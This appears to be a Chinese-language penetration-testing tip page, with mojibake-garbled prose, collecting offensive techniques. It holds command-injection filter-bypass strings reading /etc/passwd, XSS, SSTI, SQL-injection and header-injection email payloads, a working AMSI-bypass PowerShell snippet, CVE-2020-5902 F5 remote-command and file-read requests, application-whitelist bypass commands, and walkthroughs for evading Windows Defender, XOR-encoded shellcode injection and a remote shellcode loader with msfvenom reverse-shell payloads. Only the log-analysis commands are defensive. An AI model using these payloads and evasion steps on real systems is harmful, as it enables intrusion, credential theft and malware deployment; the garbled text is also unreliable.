<h2 id="å·²æ³„éœ²çš„å¯†ç æ•´ç†å‡ºçš„å­—å…¸"><a href="#å·²æ³„éœ²çš„å¯†ç æ•´ç†å‡ºçš„å­—å…¸" class="headerlink" title="å·²æ³„éœ²çš„å¯†ç æ•´ç†å‡ºçš„å­—å…¸"></a>å·²æ³„éœ²çš„å¯†ç æ•´ç†å‡ºçš„å­—å…¸</h2><pre><code>https://github.com/FlameOfIgnis/Pwdb-Public
ä»ç½‘ä¸Šæ³„éœ²çš„10äº¿æ¡æ•°æ®ä¸­æ•´ç†å‡ºçš„ã€‚é‡Œé¢257,669,588è¢«ç­›é€‰ä¸ºæŸåçš„æ•°æ®æˆ–æµ‹è¯•è´¦æˆ·ã€‚
10äº¿ä¸ªå‡­æ®å¯å½’ç»“ä¸º168,919,919å¯†ç å’Œ393,386,953ç”¨æˆ·å.
å¹³å‡å¯†ç é•¿åº¦ä¸º9.4822ä¸ªå­—ç¬¦
12.04%åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œ28.79%å¯†ç ä»…æ˜¯å­—æ¯ï¼Œ26.16%ä»…æ˜¯å°å†™ï¼Œ13.37%ä»…æ˜¯æ•°å­—ï¼Œ8.83%çš„å¯†ç ä»…è¢«å‘ç°ä¸€æ¬¡
ä¸rockyouçš„å¯¹æ¯”ï¼ŒrockyouåŒ…å«14,344,391ä¸ªå¯†ç ï¼Œæœ¬å­—å…¸ä¸rockyouç›¸å·®80%
è¿˜æœ‰æ ¹æ®ä¸åŒå›½å®¶ç”Ÿæˆçš„å°å­—å…¸
</code></pre>
<h2 id="å‘½ä»¤æ³¨å…¥Bypass"><a href="#å‘½ä»¤æ³¨å…¥Bypass" class="headerlink" title="å‘½ä»¤æ³¨å…¥Bypass"></a>å‘½ä»¤æ³¨å…¥Bypass</h2><pre><code>From: @shreyasrx
cat /etc/passwd 
cat /e&quot;t&quot;c/pa&quot;s&quot;swd 
cat /&#39;e&#39;tc/pa&#39;s&#39; swd 
cat /etc/pa??wd 
cat /etc/pa*wd 
cat /et&#39; &#39;c/passw&#39; &#39;d 
cat /et$()c/pa$()$swd
cat /et$&#123;neko&#125;c/pas$&#123;poi&#125; swd 
*echo &quot;dwssap/cte/ tac&quot; | rev 
$(echo Y2FOIC9ldGMvcGFzc3dkCg== base64 -d) 
w\ho\am\i 
/\b\i\n/////s\h 
who$@ami 
xyz%0Acat%20/etc/passwd 
IFS=,;`cat&lt;&lt;&lt;uname,-a`
/???/??t /???/p??s?? 
test=/ehhh/hmtc/pahhh/hmsswd 
cat $&#123;test//hhh\/hm/&#125; 
cat $&#123;test//hh??hm/&#125;
cat /???/?????d
&#123;cat,/etc/passwd&#125;
</code></pre>
<h2 id="æŸ¥è¯¢æ˜¯å¦å­˜åœ¨heartbleedæ¼æ´"><a href="#æŸ¥è¯¢æ˜¯å¦å­˜åœ¨heartbleedæ¼æ´" class="headerlink" title="æŸ¥è¯¢æ˜¯å¦å­˜åœ¨heartbleedæ¼æ´"></a>æŸ¥è¯¢æ˜¯å¦å­˜åœ¨heartbleedæ¼æ´</h2><pre><code>cat list.txt | while read line ; do echo &quot;QUIT&quot; | openssl s_client -connect $line:443 2&gt;&amp;1 | grep &#39;server extension &quot;heartbeat&quot; (id=15)&#39; || echo $line: safe; done
</code></pre>
<p><img src="./img/712.png" alt="image"></p>
<h2 id="è¿œç¨‹è§£å‹æ–‡ä»¶"><a href="#è¿œç¨‹è§£å‹æ–‡ä»¶" class="headerlink" title="è¿œç¨‹è§£å‹æ–‡ä»¶"></a>è¿œç¨‹è§£å‹æ–‡ä»¶</h2><pre><code>pip install remotezip
#åˆ—å‡ºè¿œç¨‹å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹
remotezip -l http://site/bigfile.zip
#è§£å‹é‡Œé¢çš„æ–‡ä»¶
remotezip &quot;http://site/bigfile.zip&quot; &quot;file.txt&quot;
</code></pre>
<h2 id="Top25-ssrf-dorks"><a href="#Top25-ssrf-dorks" class="headerlink" title="Top25 ssrf dorks"></a>Top25 ssrf dorks</h2><p><img src="./img/714.jpg" alt="image"></p>
<h2 id="ä½¿ç”¨SecurityTrails-APIæŸ¥è¯¢å­åŸŸå"><a href="#ä½¿ç”¨SecurityTrails-APIæŸ¥è¯¢å­åŸŸå" class="headerlink" title="ä½¿ç”¨SecurityTrails APIæŸ¥è¯¢å­åŸŸå"></a>ä½¿ç”¨SecurityTrails APIæŸ¥è¯¢å­åŸŸå</h2><pre><code>å»https://securitytrails.com/ç”³è¯·ä¸ªå…è´¹çš„API
curl -s --request GET --url https://api.securitytrails.com/v1/domain/target.com/subdomains?apikey=API_KEY | jq &#39;.subdomains[]&#39; | sed &#39;s/\&quot;//g&#39; &gt;test.txt 2&gt;/dev/null &amp;&amp; sed &quot;s/$/.target.com/&quot; test.txt | sed &#39;s/ //g&#39; &amp;&amp; rm test.txt
</code></pre>
<p><img src="./img/715.png" alt="image"></p>
<h2 id="é‚®ä»¶åœ°å€payload"><a href="#é‚®ä»¶åœ°å€payload" class="headerlink" title="é‚®ä»¶åœ°å€payload"></a>é‚®ä»¶åœ°å€payload</h2><pre><code>XSS
test+(&lt;script&gt;alert(0)&lt;/script&gt;)@example.com
test@example(&lt;script&gt;alert(0)&lt;/script&gt;).com
&quot;&lt;script&gt;alert(0)&lt;/script&gt;&quot;@example.com
SSTI
&quot;&lt;%= 7 * 7 %&gt;&quot;@example.com
test+($&#123;&#123;7*7&#125;&#125;)@example.com
SQL injection
&quot;&#39; OR 1=1 -- &#39;&quot;@example.com 
&quot;mail&#39;); --&quot;@example.com
SSRF
john.doe@abc123.dnslog.cn
john.doe@[127.0.0.1]
å¤´æ³¨å…¥
&quot;%0d%0aContent-Length:%200%0d%0a%0d%0a&quot;@example.com
&quot;recipient@test.com&gt;\r\nRCPT TO:&lt;victim+&quot;@test.com
</code></pre>
<h2 id="Web-serveræ—¥å¿—åˆ†æå‘½ä»¤"><a href="#Web-serveræ—¥å¿—åˆ†æå‘½ä»¤" class="headerlink" title="Web serveræ—¥å¿—åˆ†æå‘½ä»¤"></a>Web serveræ—¥å¿—åˆ†æå‘½ä»¤</h2><pre><code>https://gist.github.com/hvelarde/ceac345c662429447959625e6feb2b47
é€šè¿‡çŠ¶æ€ç è·å–è¯·æ±‚æ€»æ•°
awk &#39;&#123;print $9&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort â€“rn
</code></pre>
<p><img src="./img/716.png" alt="image"></p>
<pre><code>æŒ‰ç…§IPçš„è¯·æ±‚æ•°é‡æ’åº
awk &#39;&#123;print $1&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort -rn | head | awk -v OFS=&#39;\t&#39; &#39;&#123;&quot;host &quot; $2 | getline ip; print $0, ip&#125;&#39;
</code></pre>
<p><img src="./img/717.png" alt="image"></p>
<pre><code>æŒ‰ç…§uaçš„è¯·æ±‚æ•°é‡æ’åº
awk -F&#39;&quot;&#39; &#39;&#123;print $6&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort -rn | head
</code></pre>
<p><img src="./img/718.png" alt="image"></p>
<pre><code>æŒ‰ç…§urlçš„è¯·æ±‚æ•°é‡æ’åº
awk &#39;&#123;print $7&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort -rn | head
</code></pre>
<p><img src="./img/719.png" alt="image"></p>
<pre><code>æŒ‰ç…§è¯·æ±‚é¡µé¢ä¸º404çš„urlæ’åº
awk &#39;$9 ~ /404/ &#123;print $7&#125;&#39; /var/log/apache2/access.log | sort | uniq -c | sort -rn | head
æŒ‰ç…§è¯·æ±‚è‡´åç«¯æŠ¥é”™çš„IPæ’åº
awk &#39;$0 ~ /\[error\]/ &amp;&amp; match($0, /(client: )(.*)(, server)/, arr) &#123;print arr[2]&#125;&#39; /var/log/apache2/error.log | sort | uniq -c | sort -rn | awk -v OFS=&#39;\t&#39; &#39;&#123;&quot;host &quot; $2 | getline ip; print $0, ip&#125;&#39;
è·å–æœ€è¿‘10åˆ†é’Ÿçš„è¯·æ±‚
awk -v date=$(date +[%d/%b/%Y:%H:%M --date=&quot;-10 minutes&quot;) &#39;$4 &gt; date&#39; /var/log/nginx/access.log
</code></pre>
<h2 id="Bypass-AMSI"><a href="#Bypass-AMSI" class="headerlink" title="Bypass AMSI"></a>Bypass AMSI</h2><pre><code>$a =[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUt&#39;+&#39;ils&#39;)
$h=&quot;4456625220575263174452554847&quot;
$s =[string](0..13|%&#123;[char][int](53+($h).substring(($_*2),2))&#125;)-replace &quot; &quot;
$b =$a.GetField($s,&#39;NonPublic,Static&#39;)
$b.SetValue($null,$true)
</code></pre>
<p><img src="./img/720.png" alt="image"></p>
<h2 id="Bypass-AMSI-2"><a href="#Bypass-AMSI-2" class="headerlink" title="Bypass AMSI 2"></a>Bypass AMSI 2</h2><pre><code>https://github.com/crawl3r/FunWithAMSI
ç›´æ¥ç¼–è¯‘å®Œä½¿ç”¨å³å¯
[System.Reflection.Assembly]::LoadFile(&quot;C:\\Users\\test\\Desktop\\AmsiFun.dll&quot;)
[Amsi]::Bypass()
</code></pre>
<p><img src="./img/726.png" alt="image"><br><img src="./img/727.png" alt="image"><br><img src="./img/728.png" alt="image"></p>
<h2 id="CVE-2020-5902"><a href="#CVE-2020-5902" class="headerlink" title="CVE-2020-5902"></a>CVE-2020-5902</h2><pre><code>F5 BIG-IP TMUI RCE
https://raw.githubusercontent.com/jas502n/CVE-2020-5902/master/CVE-2020-5902.py
RCE
curl -v -k &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&#39;
è¯»æ–‡ä»¶
curl -v -k &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&#39;
æ‰§è¡ŒLinuxå‘½ä»¤
/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
/fileSave.jsp?fileName=/tmp/cmd&amp;content=id
/tmshCmd.jsp?command=list+/tmp/cmd
/tmshCmd.jsp?command=delete+cli+alias+private+list
</code></pre>
<h2 id="ä¸€äº›å¯å°è¯•ç»•è¿‡ç™½åå•çš„æ‰§è¡Œ"><a href="#ä¸€äº›å¯å°è¯•ç»•è¿‡ç™½åå•çš„æ‰§è¡Œ" class="headerlink" title="ä¸€äº›å¯å°è¯•ç»•è¿‡ç™½åå•çš„æ‰§è¡Œ"></a>ä¸€äº›å¯å°è¯•ç»•è¿‡ç™½åå•çš„æ‰§è¡Œ</h2><pre><code>forfiles /p c:\windows\system32 /m notepad.exe /c &lt;bin&gt; 
explorer.exe /root,&quot;&lt;bin&gt;&quot; 
pcalua.exe -a &lt;bin&gt; 
scriptrunner.exe -appvscript &lt;bin&gt; 
wmic process call create &lt;bin&gt; 
rundll32.exe advpack.dll, RegisterOCX &lt;bin&gt;
</code></pre>
<h2 id="ç»•è¿‡lsa-protection"><a href="#ç»•è¿‡lsa-protection" class="headerlink" title="ç»•è¿‡lsa protection"></a>ç»•è¿‡lsa protection</h2><pre><code>https://github.com/RedCursorSecurityConsulting/PPLKiller
</code></pre>
<p><img src="./img/733.png" alt="image"><br><img src="./img/734.png" alt="image"><br><img src="./img/735.png" alt="image"><br><img src="./img/736.png" alt="image"><br><img src="./img/737.png" alt="image"></p>
<h2 id="Pezorå…æ€"><a href="#Pezorå…æ€" class="headerlink" title="Pezorå…æ€"></a>Pezorå…æ€</h2><pre><code>ä½¿ç”¨inline_syscallå†…è”æ³¨å…¥shellcodeï¼Œç»“åˆsgnï¼Œdonutç­‰é¡¹ç›®ï¼Œå¢åŠ äº†ä¸€äº›åè°ƒè¯•æŠ€å·§
https://github.com/phra/PEzor
$ git clone https://github.com/phra/PEzor.git 
$ cd PEzor 
$ sudo bash install.sh 
$ bash PEzor.sh â€“h
è¿™é‡Œæµ‹è¯•ä¸‹mimikatzï¼Œ-sleepè®¾ç½®ä¸º2åˆ†é’Ÿï¼Œæ‰§è¡Œåéœ€ç­‰ä¸¤åˆ†é’Ÿ
æ‰“åŒ…ä¹‹å‰
</code></pre>
<p><img src="./img/738.png" alt="image"></p>
<pre><code>æ‰“åŒ…ä¹‹å
</code></pre>
<p><img src="./img/739.png" alt="image"><br><img src="./img/740.png" alt="image"><br><img src="./img/741.png" alt="image"></p>
<pre><code>æµ‹è¯•ä¸‹Covenant
</code></pre>
<p><img src="./img/742.png" alt="image"><br><img src="./img/743.png" alt="image"><br><img src="./img/744.png" alt="image"></p>
<h2 id="åŠ¨æ€è°ƒç”¨è¿›ç¨‹æ³¨å…¥é€»è¾‘"><a href="#åŠ¨æ€è°ƒç”¨è¿›ç¨‹æ³¨å…¥é€»è¾‘" class="headerlink" title="åŠ¨æ€è°ƒç”¨è¿›ç¨‹æ³¨å…¥é€»è¾‘"></a>åŠ¨æ€è°ƒç”¨è¿›ç¨‹æ³¨å…¥é€»è¾‘</h2><pre><code>æ„Ÿå…´è¶£å¯é˜…è¯»ä»¥ä¸‹
https://github.com/dtrizna/DInvoke_PoC
https://rastamouse.me/blog/process-injection-dinvoke/
https://thewover.github.io/Dynamic-Invoke/
è¿™é‡Œæµ‹è¯•çš„æ˜¯ä½¿ç”¨donutçš„pythonæ¨¡å—ã€‚æ³¨å…¥notepadè¿›ç¨‹
</code></pre>
<p><img src="./img/745.png" alt="image"><br><img src="./img/746.png" alt="image"></p>
<h2 id="åœ¨Windows-Server-2016å’Œ2019ä¸­ç»•è¿‡Windows-Defender"><a href="#åœ¨Windows-Server-2016å’Œ2019ä¸­ç»•è¿‡Windows-Defender" class="headerlink" title="åœ¨Windows Server 2016å’Œ2019ä¸­ç»•è¿‡Windows Defender"></a>åœ¨Windows Server 2016å’Œ2019ä¸­ç»•è¿‡Windows Defender</h2><pre><code>å½“è·å¾—äº†ä¸€ä¸ªwebshellçš„æ—¶å€™ï¼Œä¸‹ä¸€æ­¥è¦åå¼¹ä¸ªshellå›æ¥
</code></pre>
<p><img src="./img/747.png" alt="image"></p>
<pre><code>åœ¨å°è¯•äº†https://github.com/trustedsec/unicornç‹¬è§’å…½å¤±è´¥ä¹‹åï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡ä½¿ç”¨golangå°†shellcodeæ³¨å…¥åˆ°å†…å­˜çš„æ–‡ç« 
https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/
https://github.com/brimstone/go-shellcode
https://golang.org/pkg/syscall/?GOOS=windows#NewLazyDLL
è¯¥ä»£ç åˆ©ç”¨golangä¸­çš„syscallåŒ…æ¥è°ƒç”¨NewLazyDLL  æ–¹æ³•æ¥åŠ è½½Kernel32.dllï¼ŒåŠ è½½Kernel32.dllåï¼Œå³å¯å°†å…¶ç”¨äºå¯»å€å’Œå†…å­˜åˆ†é…ã€‚ç¼–è¯‘åçš„ä»£ç å°†åå…­è¿›åˆ¶æ ¼å¼çš„msfvenomå†…å®¹ç”¨ä½œå‘½ä»¤è¡Œå‚æ•°ã€‚
ç”±äºä»£ç å­˜åœ¨è®¸ä¹…ï¼Œå¯èƒ½ç›´æ¥ä½¿ç”¨ä¼šè¢«æ£€æµ‹åˆ°ï¼Œè¿™é‡Œå¯¹å…¶è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‡å‘½åæ‰€æœ‰å˜é‡ï¼Œé€šè¿‡URLæ–¹å¼åŠ è½½shellcodeï¼Œä¸ºäº†ç»•è¿‡æ²™ç›’ï¼Œæ·»åŠ äº†ä¸€äº›å…¶ä»–çš„å‚æ•°ï¼Œå¦‚æœä¸å­˜åœ¨å‚æ•°åˆ™é€€å‡ºæ‰§è¡Œã€‚
ç”¨powershellä¸‹è½½åˆ°æœåŠ¡å™¨
</code></pre>
<p><img src="./img/748.png" alt="image"></p>
<pre><code>ç­‰äº†å‡ åˆ†é’Ÿï¼Œå‘ç°æ–‡ä»¶æ²¡æœ‰è¢«åˆ é™¤ï¼Œå†æ‰§è¡Œã€‚Msfæ”¶åˆ°ä¼šè¯
</code></pre>
<p><img src="./img/749.png" alt="image"></p>
<pre><code>åœ¨å°è¯•äº†getuidå‘½ä»¤ä¹‹åï¼Œè¿”å›äº†é”™è¯¯ï¼ŒæŸ¥çœ‹äº†ä»¥ä¸‹ç›®å½•ï¼Œè¿˜æ˜¯è¢«åˆ é™¤äº†
</code></pre>
<p><img src="./img/750.png" alt="image"><br><img src="./img/751.png" alt="image"></p>
<pre><code>æœ¬åœ°å¤ç°äº†ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¢«æ£€æµ‹åˆ°äº†
</code></pre>
<p><img src="./img/752.png" alt="image"></p>
<pre><code>ç»•è¿‡å¯ä»¥çœ‹ä¸€ä¸‹å¾®è½¯çš„æ–‡ç« 
https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/configure-server-exclusions-microsoft-defender-antivirus#list-of-automatic-exclusions
Windows Server 2016å’Œ2019ä¸Šçš„Microsoft Defender Antivirusè‡ªåŠ¨å°†æ‚¨æ³¨å†Œä¸ºæŸäº›æ’é™¤é¡¹ï¼Œå…·ä½“ç”±æ‚¨æŒ‡å®šçš„æœåŠ¡å™¨è§’è‰²å®šä¹‰ã€‚è¯·å‚é˜…  è‡ªåŠ¨æ’é™¤é¡¹åˆ—è¡¨ ã€‚è¿™äº›æ’é™¤é¡¹ä¸ä¼šè¢«windows defenderæ£€æŸ¥ã€‚
</code></pre>
<p><img src="./img/753.png" alt="image"></p>
<pre><code>æŒ‰ç…§æ–‡ç« ï¼Œåˆ›å»ºä¸ªç›®å½•PHP5433ï¼Œä¿®æ”¹æ–‡ä»¶ä¸ºphp-cgi.exeå³å¯ç»•è¿‡wdçš„é˜²æŠ¤
</code></pre>
<p><img src="./img/754.png" alt="image"><br><img src="./img/755.png" alt="image"><br><img src="./img/756.png" alt="image"><br><img src="./img/757.png" alt="image"></p>
<pre><code>ä½¿ç”¨çƒ‚åœŸè±†ææƒ
</code></pre>
<p><img src="./img/758.png" alt="image"></p>
<pre><code>æ–‡ä¸­webshell: https://github.com/NetSPI/cmdsql
</code></pre>
<h2 id="å†…å­˜ä¸­è§£ç shellcodeç»•è¿‡av"><a href="#å†…å­˜ä¸­è§£ç shellcodeç»•è¿‡av" class="headerlink" title="å†…å­˜ä¸­è§£ç shellcodeç»•è¿‡av"></a>å†…å­˜ä¸­è§£ç shellcodeç»•è¿‡av</h2><pre><code>https://github.com/mhaskar/Shellcode-In-Memory-Decoder
æµç¨‹
æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹å¹¶æ£€ç´¢è¯¥è¿›ç¨‹çš„HANDLEã€‚
åœ¨è¿›ç¨‹ä¸­åˆ†é…ç©ºé—´ï¼ˆæ£€ç´¢å†…å­˜åœ°å€ï¼‰ã€‚
å°†æ•°æ®ï¼ˆshellcodeï¼‰å†™å…¥è¯¥è¿›ç¨‹ä¸­ã€‚
æ‰§è¡Œshellcodeã€‚
æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‡ ä¸ªWin32 APIæ‰§è¡Œè¿™äº›æ­¥éª¤ï¼š
OpenProcess()
VirtualAllocEx()
WriteProcessMemory()
CreateRemoteThread()
æ­£å¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†åŸå§‹shellcodeç›´æ¥å†™å…¥åˆ°å†…å­˜ä¸­ï¼Œä½†æ˜¯å¦‚æœAV /EDRæ£€æµ‹åˆ°äº†Shellcodeï¼Œå®ƒä»¬è‚¯å®šä¼šå‘å‡ºè­¦æŠ¥
æ‰€ä»¥æˆ‘ä»¬åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ä½¿ç”¨å¯é€†çš„æ–¹å¼æŠŠshellcodeç¼–ç ï¼Œå†è§£ç å†™å…¥å†…å­˜æ¥è§„é¿é˜²æŠ¤ã€‚
æ¯”å¦‚åŠ ã€å‡ã€å¼‚æˆ–ã€äº¤æ¢ã€‚
ä½¿ç”¨csç”Ÿæˆä¸ªshellcode
</code></pre>
<p><img src="./img/759.png" alt="image"></p>
<pre><code>ä½¿ç”¨pythonè¿›è¡Œå¼‚æˆ–
</code></pre>
<p><img src="./img/760.png" alt="image"></p>
<pre><code>è¯¥è„šæœ¬è¯»å–æˆ‘ä»¬çš„shellcodeçš„æ¯ä¸ªæ“ä½œç ï¼Œç„¶åå°†å…¶ä¸å­—èŠ‚0x01ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ä¸ºæˆ‘ä»¬çš„å¯†é’¥ï¼‰è¿›è¡Œå¼‚æˆ–ï¼Œå°†å…¶æ‰“å°ä¸ºå¦‚ä¸‹çš„shellcode ï¼š
</code></pre>
<p><img src="./img/761.png" alt="image"></p>
<pre><code>ç°åœ¨ï¼Œæˆ‘ä»¬å°†å¼€å§‹å®ç°å°†ä¸ºæˆ‘ä»¬æ‰§è¡Œshellcodeæ³¨å…¥çš„Cä»£ç ã€‚
ç¼–è¯‘æ–¹å¼
x86_64-w64-mingw32-gcc decoder.c -o decoder.exe -w
æˆ‘å°†é€æ­¥ä»‹ç»æ¯ä¸ªwin32 APIã€‚
æ‰“å¼€è¿‡ç¨‹å¹¶è·å–ä¸€ä¸ªå¥æŸ„
æˆ‘ä»¬éœ€è¦é€‰æ‹©ä¸€ä¸ªå‘å…¶æ³¨å…¥shellcodeçš„è¿›ç¨‹ï¼Œç„¶åéœ€è¦æ£€ç´¢è¯¥è¿‡ç¨‹çš„å¥æŸ„ï¼Œä»¥ä¾¿å¯ä»¥å¯¹å…¶æ‰§è¡Œä¸€äº›æ“ä½œï¼Œæˆ‘ä»¬å°†ä½¿ç”¨OpenProcess win32 API
</code></pre>
<p><img src="./img/762.png" alt="image"></p>
<pre><code>è¯¥ä»£ç å°†æ‚¨è¦è·å–å…¶å¥æŸ„çš„è¿›ç¨‹IDä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç„¶åå®ƒå°†ä½¿ç”¨å…·æœ‰PROCESS_ALL_ACCESSè®¿é—®æƒé™çš„OpenProcess()æ¥æ‰“å¼€è¯¥è¿›ç¨‹å¹¶å°†è¯¥å¥æŸ„ä¿å­˜åœ¨å˜é‡processä¸­ï¼Œæœ€åï¼Œä¸ºæˆ‘ä»¬æ‰“å°
</code></pre>
<p><img src="./img/763.png" alt="image"></p>
<pre><code>æˆåŠŸæ£€ç´¢åˆ°è¯¥å¥æŸ„
æ£€ç´¢å¥æŸ„åçš„ä¸‹ä¸€æ­¥å°†æ˜¯åœ¨è¯¥è¿›ç¨‹å†…åˆ†é…ç©ºé—´ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨VirtualAllocEx()
</code></pre>
<p><img src="./img/764.png" alt="image"></p>
<pre><code>base_addressä»£è¡¨åˆ†é…çš„å†…å­˜çš„åœ°å€
16è¡Œï¼Œæˆ‘ä»¬å°†æ‰“å°åˆ†é…çš„å†…å­˜çš„åœ°å€ï¼Œå¹¶å°†å…¶å†™å…¥æ•°æ®
</code></pre>
<p><img src="./img/765.png" alt="image"></p>
<pre><code>0x29d0000ä½œä¸ºåœ°å€ï¼Œ
ä½¿ç”¨x64dbgé™„åŠ explorer.exeè¿›ç¨‹ï¼Œè½¬åˆ°è¿™é‡Œçœ‹çœ‹
</code></pre>
<p><img src="./img/766.png" alt="image"></p>
<pre><code>å¯ä»¥çœ‹åˆ°å‡½æ•°VirtualAllocExå·²ä¸ºæˆ‘ä»¬åœ¨explorer.exeä¸­åˆ†é…äº†å†…å­˜ç©ºé—´ï¼Œæˆ‘ä»¬å‡†å¤‡å†™å…¥æ•°æ®ã€‚
æ¥ä¸‹æ¥æˆ‘ä»¬è§£ç shellcodeå¹¶å†™åˆ°å†…å­˜ä¸­
å³ä½¿ä½¿ç”¨è¿™ç§ç±»å‹ï¼ˆè¿™é‡Œç”¨çš„æ˜¯å¼‚æˆ–ï¼‰çš„ç¼–ç ï¼Œæˆ‘ä»¬çš„shellcodeä¹Ÿå¯èƒ½ä¼šè¢«æ ‡è®°ï¼Œå› æ­¤è¯·ç¡®ä¿åœ¨æ“ä½œä¸­ä½¿ç”¨ä¹‹å‰ä½¿ç”¨æ›´å¼ºçš„ç¼–ç å¹¶å¯¹å…¶è¿›è¡Œæµ‹è¯•ã€‚
è¿™é‡Œä¸ºæµ‹è¯•å°±åªä½¿ç”¨çš„0x01
</code></pre>
<p><img src="./img/767.png" alt="image"></p>
<pre><code>è¿™æ®µä»£ç å°†ä½¿ç”¨å¯†é’¥0x01å¯¹æ¯ä¸ªå­—èŠ‚è¿›è¡Œè§£ç åï¼Œå°†æˆ‘ä»¬çš„shellcodeå†™å…¥å†…å­˜ä¸­
è¿è¡Œ
</code></pre>
<p><img src="./img/768.png" alt="image"></p>
<pre><code>å¦‚å›¾æ‰€è§ï¼Œæˆ‘ä»¬å°†æ¯ä¸ªå­—èŠ‚å†™å…¥åœ°å€ï¼Œç°åœ¨æˆ‘ä»¬ç”¨x64dbgè¿›è¡Œè°ƒè¯•ï¼Œç„¶åè½¬åˆ°åœ°å€ 0x3ce0000æŸ¥çœ‹ä¸€ä¸‹ï¼š
</code></pre>
<p><img src="./img/769.png" alt="image"></p>
<pre><code>å¯ä»¥çœ‹åˆ°shellcodeå·²ç»å†™å…¥è¿›å»äº†ã€‚
ä¸‹ä¸€æ­¥å°±æ˜¯æ‰§è¡Œshellcodeäº†
ä½¿ç”¨CreateRemoteThread()å‡½æ•°æ¥æ‰§è¡Œ
</code></pre>
<p><img src="./img/770.png" alt="image"><br><img src="./img/771.png" alt="image"><br><img src="./img/772.png" alt="image"></p>
<h2 id="cshot-shellcodeè¿œç¨‹åŠ è½½å™¨"><a href="#cshot-shellcodeè¿œç¨‹åŠ è½½å™¨" class="headerlink" title="cshot shellcodeè¿œç¨‹åŠ è½½å™¨"></a>cshot shellcodeè¿œç¨‹åŠ è½½å™¨</h2><pre><code>From:
https://github.com/anthemtotheego/C_Shot
http://blog.redxorblue.com/2020/07/cshot-just-what-doctor-ordered.html
C_Shotæ˜¯ä¸€ç§ç”¨Cè¯­è¨€ç¼–å†™çš„æ”»å‡»æ€§å®‰å…¨å·¥å…·ï¼Œæ—¨åœ¨é€šè¿‡HTTP / HTTPSä¸‹è½½è¿œç¨‹shellcodeäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆ.binï¼‰ï¼Œæ³¨å…¥å¹¶æ‰§è¡Œshellcodeã€‚
1.shellcodeæ³¨å…¥å…¶è‡ªå·±çš„è¿›ç¨‹
2.ä½¿ç”¨çˆ¶è¿›ç¨‹æ¬ºéª—å°†shellcodeæ³¨å…¥å­è¿›ç¨‹
ä½¿ç”¨C_Shotä¹‹ç±»çš„å·¥å…·çš„å¥½å¤„æ˜¯ï¼Œæˆ‘ä»¬è¦æ‰§è¡Œçš„æ¶æ„ä»£ç æ²¡æœ‰å­˜å‚¨åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œè€Œæ˜¯ä»è¿œç¨‹ä½ç½®æ£€ç´¢ï¼Œè¯»å…¥å†…å­˜ç„¶åæ‰§è¡Œã€‚è¿™æœ‰åŠ©äºä½¿è¯¸å¦‚C_Shotä¹‹ç±»çš„å·¥å…·å¯¹AV / EDRæ˜¾å¾—ç›¸å½“å‹å¥½ï¼Œå¹¶ä¸”ä¸ä¼šè¢«å‘ç°ã€‚
</code></pre>
<p><img src="./img/773.png" alt="image"></p>
<pre><code>cl / D _UNICODE / D UNICODE cshot.c
</code></pre>
<p><img src="./img/774.png" alt="image"></p>
<pre><code>ç”Ÿæˆåˆ†é˜¶æ®µpayload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -a x64 --platform windows -b &quot;\x00&quot; -f raw -o /root/Desktop/DefaultStaged.bin
ç”Ÿæˆæ— é˜¶æ®µpayload
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST= IP LPORT= PORT -a x64 --platform windows -b &quot;\x00&quot; -f raw -o /root/Desktop/DefaultStageless.bin
ç°åœ¨æˆ‘ä»¬å·²ç»å»ºç«‹äº†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç°åœ¨éœ€è¦ä¸€ä¸ªWebæœåŠ¡ã€‚ä¾‹å¦‚è¿è¡Œpython -m SimpleHTTPServer 80ï¼Œæˆ–è€…å°†å®ƒä»¬æ‰˜ç®¡åœ¨å¤–éƒ¨æŸä¸ªåœ°æ–¹ã€‚å¯¹äºæœ¬æ–‡ä¸­çš„æ‰€æœ‰ç¤ºä¾‹ï¼Œæˆ‘å°†ä½¿ç”¨githubæ‰˜ç®¡shellcodeã€‚
</code></pre>
<p><img src="./img/775.png" alt="image"></p>
<pre><code>ç¡®ä¿windows defenderæ‰“å¼€ã€‚
</code></pre>
<p><img src="./img/776.png" alt="image"></p>
<pre><code>æ³¨å…¥åˆ°è‡ªå·±çš„è¿›ç¨‹ä¸­
</code></pre>
<p><img src="./img/777.png" alt="image"></p>
<pre><code>æµ‹è¯•åˆ†é˜¶æ®µçš„shellcodeä¼šè¢«windows defenderæ‹¦æˆª
</code></pre>
<p><img src="./img/778.png" alt="image"></p>
<pre><code>æ— é˜¶æ®µçš„shellcodeä¸ä¼šè¢«æ‹¦æˆª
</code></pre>
<p><img src="./img/779.png" alt="image"></p>
<pre><code>è·å¾—shell
</code></pre>
<p><img src="./img/780.png" alt="image"></p>
<pre><code>æµ‹è¯•åˆ†é˜¶æ®µshellcodeæ¬ºéª—çˆ¶è¿›ç¨‹æ–¹æ³•ï¼š
</code></pre>
<p><img src="./img/781.png" alt="image"><br><img src="./img/782.png" alt="image"></p>
<pre><code>è·å¾—shell
</code></pre>
<p><img src="./img/783.png" alt="image"></p>
